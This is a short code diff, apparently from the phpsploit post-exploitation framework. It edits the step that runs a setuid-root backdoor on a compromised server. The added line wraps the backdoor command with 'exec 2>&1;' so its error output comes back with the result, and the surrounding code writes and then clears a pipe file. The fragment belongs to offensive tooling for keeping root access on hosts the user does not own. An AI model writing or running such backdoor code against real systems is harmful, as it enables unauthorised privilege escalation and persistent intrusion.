@@ -20,6 +20,7 @@ fclose($pipe_file);
 
 // execute SUIDROOT_BACKDOOR
 $result = execute($PHPSPLOIT['BACKDOOR']);
+$result = execute("exec 2>&1;" . $PHPSPLOIT['BACKDOOR']);
 file_put_contents($PHPSPLOIT['PIPE'], "");
 return $result;
 
